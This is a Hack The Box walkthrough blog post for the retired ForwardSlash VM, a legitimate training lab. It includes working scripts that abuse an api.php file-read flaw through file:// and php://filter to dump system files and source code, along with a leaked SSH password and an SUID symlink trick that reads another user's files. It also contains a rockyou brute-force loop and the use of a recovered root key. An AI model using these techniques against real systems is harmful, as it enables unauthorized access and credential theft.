---
layout: post
title: "ForwardSlash: Hack The Box Walkthrough"
date: 2020-07-06 04:22:26 +0000
last_modified_at: 2020-07-06 04:22:26 +0000
category: Walkthrough
tags: ["Hack The Box", ForwardSlash, retired, Linux, Hard]
comments: true
image:
  feature: forwardslash-htb-walkthrough.png
---

This post documents the complete walkthrough of ForwardSlash, a retired vulnerable [VM][1] created by [chivato][2] and [InfoSecJack][3], and hosted at [Hack The Box][4]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

ForwardSlash is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.183 --rate=500

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-04-07 01:50:44 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 80/tcp on 10.10.10.183
Discovered open port 22/tcp on 10.10.10.183
```

You know a box is hard when there are only two open ports. Let's do one better with `nmap` scanning the discovered ports to establish their services.

```
# nmap -n -v -Pn -p22,80 -A --reason 10.10.10.183 -oN nmap.txt
...
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 3c:3b:eb:54:96:81:1d:da:d7:96:c7:0f:b4:7e:e1:cf (RSA)
|   256 f6:b3:5f:a2:59:e3:1e:57:35:36:c3:fe:5e:3d:1f:66 (ECDSA)
|_  256 1b:de:b8:07:35:e8:18:2c:19:d8:cc:dd:77:9c:f2:5e (ED25519)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Did not follow redirect to http://forwardslash.htb
```

I'd better put `forwardslash.htb` in `/etc/hosts`. Here's what the site looks like.

{% include image.html image_alt="cd5f451f.png" image_src="/2b825485-6959-4b81-bef1-3f1f279b1b67/cd5f451f.png" %}

### Directory/File Enumeration

In any case, let's check in with `gobuster` and SecLists, and see what we get.

```
# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,txt,xml -e -t 20 -s '200,302' -u http://10.10.10.183/
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.183/
[+] Threads:        20
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Status codes:   200,302
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt,xml
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/04/15 09:27:41 Starting gobuster
===============================================================
http://10.10.10.183/index.php (Status: 302)
http://10.10.10.183/index.php (Status: 302)
http://10.10.10.183/note.txt (Status: 200)
===============================================================
2020/04/15 09:30:54 Finished
===============================================================
```

Ok. There's a note.

{% include image.html image_alt="a0a3f41e.png" image_src="/2b825485-6959-4b81-bef1-3f1f279b1b67/a0a3f41e.png" %}

### Virtual Hosting

Sounds like we have a virtual host.

```
# curl -i -H "Host: backup.forwardslash.htb" http://10.10.10.183; echo
HTTP/1.1 302 Found
Date: Wed, 15 Apr 2020 09:59:54 GMT
Server: Apache/2.4.29 (Ubuntu)
Set-Cookie: PHPSESSID=947307vi7crqnk10sfbj7bopn9; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
location: login.php
Content-Length: 33
Content-Type: text/html; charset=UTF-8

Redirecting you to the login page
```

Bingo. I better put `backup.forwardslash.htb` into `/etc/hosts` as well. Here's what it looks like.

{% include image.html image_alt="742bb39f.png" image_src="/2b825485-6959-4b81-bef1-3f1f279b1b67/742bb39f.png" %}

### Directory/File Enumeration (2)

I think it's wise to do a fresh round of enumeration at this point.

```
# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,txt,xml -e -t 20 -s '200,302' -u http://backup.forwardslash.htb/
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://backup.forwardslash.htb/
[+] Threads:        20
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Status codes:   200,302
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt,xml
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/04/15 10:05:39 Starting gobuster
===============================================================
http://backup.forwardslash.htb/api.php (Status: 200)
http://backup.forwardslash.htb/config.php (Status: 200)
http://backup.forwardslash.htb/dev (Status: 301)
http://backup.forwardslash.htb/environment.php (Status: 302)
http://backup.forwardslash.htb/index.php (Status: 302)
http://backup.forwardslash.htb/index.php (Status: 302)
http://backup.forwardslash.htb/login.php (Status: 200)
http://backup.forwardslash.htb/logout.php (Status: 302)
http://backup.forwardslash.htb/register.php (Status: 200)
http://backup.forwardslash.htb/welcome.php (Status: 302)
===============================================================
2020/04/15 10:08:48 Finished
===============================================================
```

`/dev` and `api.php` sure look interesting.

**`/dev`**

```
# curl -i http://backup.forwardslash.htb/dev/
HTTP/1.0 403 Forbidden
Date: Thu, 16 Apr 2020 07:55:54 GMT
Server: Apache/2.4.29 (Ubuntu)
Set-Cookie: PHPSESSID=qhh4eg87a66giq5g5a39rs6ud1; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 66
Connection: close
Content-Type: text/html; charset=UTF-8

<h1>403 Access Denied</h1><h3>Access Denied From 10.10.16.125</h3>
```

**`api.php`**

```
# curl -i http://backup.forwardslash.htb/api.php
HTTP/1.1 200 OK
Date: Thu, 16 Apr 2020 01:19:26 GMT
Server: Apache/2.4.29 (Ubuntu)
Set-Cookie: PHPSESSID=vmv8dokj32t2sifk2v1ltq0ca5; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 127
Content-Type: text/html; charset=UTF-8

<!-- TODO: removed all the code to actually change the picture after backslash gang attacked us, simply echos as debug now -->
```

What does `wfuzz` with the `burp-parameter-names` wordlist tell us?

```
# wfuzz -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -d "FUZZ=foo" --hh 127 -t 20 http://backup.forwardslash.htb/api.php
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://backup.forwardslash.htb/api.php
Total requests: 2588

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000006:   200        0 L      8 W      33 Ch       "url"
000000669:   200        1 L      22 W     127 Ch      "sortorder"                                                                                                        ^C
Finishing pending requests...
```

Let's give `url` a shot and see what happens.

```
# curl -i -d "url=foo"  http://backup.forwardslash.htb/api.php
HTTP/1.1 200 OK
Date: Thu, 16 Apr 2020 01:21:35 GMT
Server: Apache/2.4.29 (Ubuntu)
Set-Cookie: PHPSESSID=m09n18nkdq52li6n8gp96092k2; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 33
Content-Type: text/html; charset=UTF-8

User must be logged in to use API
```

OK. Long story short. I could register for a new account and that would get me a new PHPSESSID. Armed with that insight, I wrote a simple shell script that allows me to read files off the box remotely.

<div class="filename"><span>read.sh</span></div>

```shell
#!/bin/bash

HOST=backup.forwardslash.htb
USER=admin
PASS=password
FILE=$1
COOKIE=$(mktemp -u)

# login
curl -c $COOKIE \
     -s \
     -o /dev/null \
     -d "username=$USER&password=$PASS" \
     http://$HOST/login.php

# read
curl -b $COOKIE \
     -s \
     -d "url=file:///$FILE" \
     http://$HOST/api.php

# clean up
rm -f $COOKIE
```

Let's give it a shot by reading `/etc/passwd`.

{% include image.html image_alt="114eb9b0.png" image_src="/2b825485-6959-4b81-bef1-3f1f279b1b67/114eb9b0.png" %}

Sweet but what's next?

### Permission Denied; not that way ;)

Normally, the **docroot** of a virtual host is located in `/var/www` and in our case, the **docroot** of `backup.forwardslash.htb` is exactly that. Now, this is what happens when you try the lazy-ass way of reading files from the **docroot** of the virtual host.

```
# ./read.sh /var/www/backup.forwardslash.htb/api.php; echo
Permission Denied; not that way ;)
```

Let's switch it up with a PHP filter wrapper.

<div class="filename"><span>read.sh</span></div>

```shell
#!/bin/bash

HOST=backup.forwardslash.htb
USER=admin
PASS=password
FILE=$1
COOKIE=$(mktemp -u)

# login
curl -c $COOKIE \
     -s \
     -o /dev/null \
     -d "username=$USER&password=$PASS" \
     http://$HOST/login.php

# read
curl -b $COOKIE \
     -s \
     -d "url=php://filter/convert.base64-encode/resource=$FILE" \
     http://$HOST/api.php \
| base64 -d

# clean up
rm -f $COOKIE
```

Litmus test?

{% include image.html image_alt="44d2ddc4.png" image_src="/2b825485-6959-4b81-bef1-3f1f279b1b67/44d2ddc4.png" %}

Bingo.

## Low-Privilege Shell

Recall the `/dev` directory where we have no access? Let's see if we can read it now.

<div class="filename"><span>index.php</span></div>

~~~php
<?php
//include_once ../session.php;
// Initialize the session
session_start();

if((!isset($_SESSION["loggedin"]) || $_SESSION["loggedin"] !== true || $_SESSION['username'] !== "admin") && $_SERVER['REMOTE_ADDR'] !== "127.0.0.1"){
    header('HTTP/1.0 403 Forbidden');
    echo "<h1>403 Access Denied</h1>";
    echo "<h3>Access Denied From ", $_SERVER['REMOTE_ADDR'], "</h3>";
    //echo "<h2>Redirecting to login in 3 seconds</h2>"
    //echo '<meta http-equiv="refresh" content="3;url=../login.php" />';
    //header("location: ../login.php");
    exit;
}
?>
<html>
        <h1>XML Api Test</h1>
        <h3>This is our api test for when our new website gets refurbished</h3>
        <form action="/dev/index.php" method="get" id="xmltest">
                <textarea name="xml" form="xmltest" rows="20" cols="50"><api>
    <request>test</request>
</api>
</textarea>
                <input type="submit">
        </form>

</html>

<!-- TODO:
Fix FTP Login
-->

<?php
if ($_SERVER['REQUEST_METHOD'] === "GET" && isset($_GET['xml'])) {

        $reg = '/ftp:\/\/[\s\S]*\/\"/';
        //$reg = '/((((25[0-5])|(2[0-4]\d)|([01]?\d?\d)))\.){3}((((25[0-5])|(2[0-4]\d)|([01]?\d?\d))))/'

        if (preg_match($reg, $_GET['xml'], $match)) {
                $ip = explode('/', $match[0])[2];
                echo $ip;
                error_log("Connecting");

                $conn_id = ftp_connect($ip) or die("Couldn't connect to $ip\n");

                error_log("Logging in");

                if (@ftp_login($conn_id, "chiv", 'N0bodyL1kesBack/')) {

                        error_log("Getting file");
                        echo ftp_get_string($conn_id, "debug.txt");
                }

                exit;
        }

        libxml_disable_entity_loader (false);
        $xmlfile = $_GET["xml"];
        $dom = new DOMDocument();
        $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
        $api = simplexml_import_dom($dom);
        $req = $api->request;
        echo "-----output-----<br>\r\n";
        echo "$req";
}

function ftp_get_string($ftp, $filename) {
    $temp = fopen('php://temp', 'r+');
    if (@ftp_fget($ftp, $temp, $filename, FTP_BINARY, 0)) {
        rewind($temp);
        return stream_get_contents($temp);
    }
    else {
        return false;
    }
}

?>
~~~

We have `chiv`'s password (`N0bodyL1kesBack/`)! Now, let's see if we can log in via SSH.

{% include image.html image_alt="b9bb6f2a.png" image_src="/2b825485-6959-4b81-bef1-3f1f279b1b67/b9bb6f2a.png" %}

:thumbsup:

## Privilege Escalation

During enumeration of `chiv`'s account, I noticed that `user.txt` is in `pain`'s home directory and only readable by `pain`. What's interesting is that there's a executable SUID to `pain`.

{% include image.html image_alt="496c44f7.png" image_src="/2b825485-6959-4b81-bef1-3f1f279b1b67/496c44f7.png" %}

Well, let's check out what `note.txt` says.

```
Pain, even though they got into our server, I made sure to encrypt any important files and then did some crypto magic on the key... I gave you the key in person the other day, so unless these hackers are some crypto experts we should be good to go.

-chiv
```

### Reverse Engineering of `backup`

This is the second-half of the first code block of the `main` function, before it branches off.

{% include image.html image_alt="9d5f4e22.png" image_src="/2b825485-6959-4b81-bef1-3f1f279b1b67/9d5f4e22.png" %}

It reads a file with a name that's the MD5 hash of the current time in %H:%M:%S format, essentially `date +%T`, and prints the contents of the file to `stdout`. With that in mind, it's trivial to write a simple shell script to read file as `pain`.

<div class="filename"><span>show.sh</span></div>

```shell
#!/bin/bash

ln -s $1 $(echo -n `date +%T` | md5sum | cut -d '-' -f1)
/usr/bin/backup | sed 1,8d
```

Let's grab that `user.txt`.

{% include image.html image_alt="6bdbdcdf.png" image_src="/2b825485-6959-4b81-bef1-3f1f279b1b67/6bdbdcdf.png" %}

While we are at it, let's grab the `config.php.bak` as well.

{% include image.html image_alt="6f1da4ab.png" image_src="/2b825485-6959-4b81-bef1-3f1f279b1b67/6f1da4ab.png" %}

### Another Low-Privilege Shell

Maybe that's the SSH password of `pain`? Who knows? Let's give it a shot.

{% include image.html image_alt="b6c7a4b0.png" image_src="/2b825485-6959-4b81-bef1-3f1f279b1b67/b6c7a4b0.png" %}

:heart_eyes:

### Rolling your own crypto

Nothing good comes out of rolling your own cryptography when it comes to encryption/decryption. I wrote a simple shell wrapper around `encrypter.py` to brute-force the key. I made the assumption that the decrypted text contains "encrypt", "decrypt", "key" or "pass".

<div class="filename"><span>brute.sh</span></div>

~~~~shell
#!/bin/bash

KEY="$1"

function die() {
    killall perl 2>/dev/null
}

if python encrypter.py "$KEY" | tr -cd '[:print:]\n' | grep -Ei '([de][en]crypt|key|pass)' &>/dev/null; then
    echo "[+] Key: $KEY"
    echo "[+] Length: $(echo -n $KEY | wc -c)"
    echo "[+] Message: $(python encrypter.py $KEY)"
    echo
    die
fi
~~~~

Combined with GNU Parallel, you get a poor man's version of a multi-threaded brute-forcer.

```
# time parallel -j20 ./brute.sh '{}' < rockyou.txt 2>/dev/null | tee gotcha.txt
[+] Key: teamareporsiempre
[+] Length: 17
[+] Message: H[2fv/vXLlyyou liked my new encryption tool, pretty secure huh, anyway here is the key to the encrypted image from /var/backups/recovery: cB!6%sdH8Lj^@Y*$C2cf


real    0m55.392s
user    2m0.848s
sys     1m24.540s
```

So the key is `teamareporsiempre`. In Spanish, it stands for "iloveyouforever". :wink:

### Mounting LUKS

During enumeration of `pain`'s account, I also notice the following.

{% include image.html image_alt="ac843e4f.png" image_src="/2b825485-6959-4b81-bef1-3f1f279b1b67/ac843e4f.png" %}

Time to mount the encrypted image!

{% include image.html image_alt="7de19fc4.png" image_src="/2b825485-6959-4b81-bef1-3f1f279b1b67/7de19fc4.png" %}

### The End

Well, what's `id_rsa`?

{% include image.html image_alt="1a482aa4.png" image_src="/2b825485-6959-4b81-bef1-3f1f279b1b67/1a482aa4.png" %}

I suspect that's the RSA private key to `root`'s account. Well there's only one way to find out.

{% include image.html image_alt="ddbbd1d3.png" image_src="/2b825485-6959-4b81-bef1-3f1f279b1b67/ddbbd1d3.png" %}

The end is here.

{% include image.html image_alt="7aaad9c0.png" image_src="/2b825485-6959-4b81-bef1-3f1f279b1b67/7aaad9c0.png" %}

:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/239
[2]: https://www.hackthebox.eu/home/users/profile/44614
[3]: https://www.hackthebox.eu/home/users/profile/52045
[4]: https://www.hackthebox.eu/

*[LUKS]: Linux Unified Key Setup
